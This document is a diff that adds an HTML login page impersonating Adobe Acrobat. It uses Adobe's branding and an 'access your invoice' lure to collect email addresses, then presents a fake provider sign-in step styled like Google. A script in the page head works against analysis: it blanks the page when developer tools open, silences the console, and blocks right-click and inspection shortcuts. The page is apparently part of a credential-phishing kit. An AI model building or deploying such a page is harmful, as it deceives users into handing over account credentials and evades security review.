@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in — Adobe Acrobat</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --accent: #eb1000;
+      --accent-hover: #c40d00;
+      --text: #1a1a1a;
+      --text-dim: #5a5a5f;
+      --text-mute: #8a8a90;
+      --border: #e1e1e4;
+      --bg: #f7f7f8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%;
+      font-family: 'Inter', 'Adobe Clean', -apple-system, sans-serif;
+      background: linear-gradient(135deg, #fafafa 0%, #f0f0f4 100%);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      letter-spacing: -0.005em;
+    }
+    .page {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      position: relative;
+    }
+    /* Decorative background */
+    .bg-blob {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.35;
+      z-index: 0;
+    }
+    .bg-blob.b1 { top: -120px; left: -100px; width: 400px; height: 400px; background: #ff6b6b; }
+    .bg-blob.b2 { bottom: -150px; right: -100px; width: 480px; height: 480px; background: #ffb86b; }
+    .bg-blob.b3 { top: 40%; right: 10%; width: 240px; height: 240px; background: #ffd66b; opacity: 0.25; }
+
+    .card {
+      width: 440px;
+      max-width: 100%;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);
+      padding: 44px 40px 36px;
+      position: relative;
+      z-index: 1;
+      animation: rise 400ms cubic-bezier(.4, 0, .2, 1);
+    }
+    @keyframes rise { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+    .brand-mark {
+      width: 52px;
+      height: 52px;
+      background: linear-gradient(135deg, #fa1d1d 0%, #d10000 100%);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 6px 18px rgba(235, 16, 0, 0.3);
+    }
+    .brand-mark svg { width: 30px; height: 30px; }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 800;
+      text-align: center;
+      letter-spacing: -0.03em;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      text-align: center;
+      color: var(--text-mute);
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    .oauth-btn {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      padding: 13px 18px;
+      border: 1.5px solid var(--border);
+      background: #fff;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      cursor: pointer;
+      margin-bottom: 10px;
+      font-family: inherit;
+      transition: all 140ms cubic-bezier(.4,0,.2,1);
+      position: relative;
+    }
+    .oauth-btn:hover {
+      border-color: #c0c0c5;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+    }
+    .oauth-btn:active { transform: translateY(0); }
+    .oauth-btn .icon { width: 20px; height: 20px; flex-shrink: 0; }
+    .oauth-btn .icon svg { width: 100%; height: 100%; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 22px 0 18px;
+      color: var(--text-mute);
+      font-size: 12px;
+      font-weight: 500;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .field {
+      margin-bottom: 14px;
+    }
+    .field label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 6px;
+    }
+    .field input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-size: 14px;
+      font-family: inherit;
+      background: #fff;
+      color: var(--text);
+      outline: none;
+      transition: all 140ms;
+    }
+    .field input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(235, 16, 0, 0.1);
+    }
+    .field input.error {
+      border-color: var(--accent);
+      animation: shake 280ms;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 13px;
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 140ms;
+      box-shadow: 0 4px 14px rgba(235, 16, 0, 0.3);
+    }
+    .submit-btn:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 6px 20px rgba(235, 16, 0, 0.4);
+    }
+    .submit-btn:active { transform: translateY(0); }
+    .submit-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .error-msg {
+      color: var(--accent);
+      font-size: 12px;
+      margin-top: 8px;
+      display: none;
+    }
+    .error-msg.show { display: block; }
+
+    .footer-text {
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-mute);
+      margin-top: 24px;
+      line-height: 1.6;
+    }
+    .footer-text a { color: var(--text-dim); text-decoration: none; font-weight: 600; }
+    .footer-text a:hover { color: var(--accent); }
+
+    .legal {
+      text-align: center;
+      font-size: 11px;
+      color: var(--text-mute);
+      margin-top: 24px;
+      max-width: 380px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .legal a { color: var(--text-dim); }
+
+    /* Loading state */
+    .oauth-btn.loading {
+      pointer-events: none;
+      opacity: 0.7;
+    }
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(0,0,0,0.1);
+      border-top-color: var(--text);
+      border-radius: 50%;
+      animation: spin 600ms linear infinite;
+      display: none;
+    }
+    .oauth-btn.loading .spinner { display: block; }
+    .oauth-btn.loading .icon { display: none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Login flow states */
+    .login-state { display: none; animation: fadeIn 200ms ease; }
+    .login-state.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .login-back {
+      background: none; border: none; color: var(--text-dim);
+      font-size: 13px; font-weight: 500; font-family: inherit;
+      cursor: pointer; display: flex; align-items: center; gap: 6px;
+      padding: 4px 8px; margin-left: -8px; margin-bottom: 12px; border-radius: 6px;
+    }
+    .login-back:hover { background: #f0f0f3; color: var(--text); }
+
+    .provider-logo {
+      display: flex; align-items: center; justify-content: center;
+      height: 50px; margin-bottom: 16px;
+    }
+    .provider-logo svg { max-height: 44px; max-width: 130px; }
+
+    .provider-pill {
+      display: inline-flex; align-items: center; gap: 8px;
+      border: 1px solid var(--border); border-radius: 18px;
+      padding: 5px 14px 5px 5px; font-size: 13px; margin: 0 0 18px; color: var(--text);
+    }
+    .pp-av {
+      width: 24px; height: 24px; border-radius: 50%;
+      background: var(--accent); color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 600;
+    }
+
+    .provider-btn {
+      width: 100%; padding: 13px; background: #1a73e8; color: #fff;
+      border: none; border-radius: 10px; font-size: 14px; font-weight: 700;
+      cursor: pointer; font-family: inherit; transition: all 140ms;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.15);
+    }
+    .provider-btn:hover { transform: translateY(-1px); filter: brightness(0.92); }
+    .provider-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+    .hidden { display: none !important; }
+
+    /* Password step */
+    .login-state[data-lf-step="password"] {
+      text-align: center;
+    }
+    .login-state[data-lf-step="password"] .login-back {
+      margin-bottom: 12px;
+    }
+    .login-state[data-lf-step="password"] .pass-form {
+      text-align: left;
+    }
+    .login-state[data-lf-step="password"] .pass-form .field input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(235, 16, 0, 0.1);
+    }
+    .login-state[data-lf-step="password"] .error-msg {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    @media (max-width: 480px) {
+      .card { padding: 32px 24px 28px; border-radius: 14px; }
+      h1 { font-size: 22px; }
+      .subtitle { font-size: 13px; margin-bottom: 24px; }
+    }
+  </style>
+  <!-- Anti-debugging & tamper protection -->
+  <script>
+  (() => {
+    const chk = () => {
+      if ((window.outerHeight - window.innerHeight) > 100 || (window.outerWidth - window.innerWidth) > 100) {
+        document.body.innerHTML = '';
+        window.location.href = 'about:blank';
+      }
+    };
+    window.addEventListener('resize', chk);
+    const noop = () => {};
+    ['log','debug','info','warn','error','assert','count','time'].forEach(m => console[m] = noop);
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','C','J','K'].includes(e.key))) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    });
+  })();
+  </script>
+</head>
+<body>
+  <div class="page">
+    <div class="bg-blob b1"></div>
+    <div class="bg-blob b2"></div>
+    <div class="bg-blob b3"></div>
+
+    <div class="card login-card" id="loginFlowContainer">
+      <!-- STEP 1: Enter email -->
+      <div class="login-state active" data-lf-step="email">
+        <div class="brand-mark">
+          <svg viewBox="0 0 240 234" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#fff" d="M152 0h88v234zM88 0H0v234zM120 86l56 148h-37l-17-42H81z"/>
+          </svg>
+        </div>
+
+        <h1>Continue to Acrobat</h1>
+        <p class="subtitle">Enter your email to continue</p>
+
+        <form data-lf-form autocomplete="off">
+          <div class="field">
+            <label for="lfEmail">Email address</label>
+            <input type="email" id="lfEmail" data-lf-email-input placeholder="" required autofocus />
+            <input type="text" name="_hp" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;" tabindex="-1" autocomplete="off" />
+          </div>
+          <p class="error-msg hidden" data-lf-error></p>
+          <button type="submit" class="submit-btn">Continue</button>
+        </form>
+
+        <p class="legal">
+          Enter your email address to access your invoice.
+        </p>
+      </div>
+
+      <!-- STEP 2: Provider detected -->
+      <div class="login-state" data-lf-step="provider" style="text-align:center;">
+        <button class="login-back" data-lf-back-btn><i class="fas fa-arrow-left"></i> Back</button>
+
+        <div class="provider-logo" data-lf-provider-logo></div>
+
+        <p data-lf-brand-name style="display:none;font-size:13px;color:#5a5a5f;margin-bottom:8px;font-weight:600;"></p>
+        <h1 style="font-size:20px;margin-bottom:6px;" data-lf-provider-name>Sign in with Google</h1>
+
+        <div class="provider-pill" data-lf-email-pill></div>
+
+        <p class="error-msg hidden" data-lf-error style="text-align:center;margin-bottom:10px;"></p>
+
+        <button class="provider-btn" data-lf-continue-btn>Continue with Google</button>
+
+        <p class="legal" style="margin-top:18px;">
+          You'll be redirected to your email provider to sign in securely.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+    import { initLoginFlow } from '/js/login-flow.js';
+    initLoginFlow(document.getElementById('loginFlowContainer'), {
+      onSuccess: () => { window.location.href = '/'; }
+    });
+  </script>
+</body>
+</html>
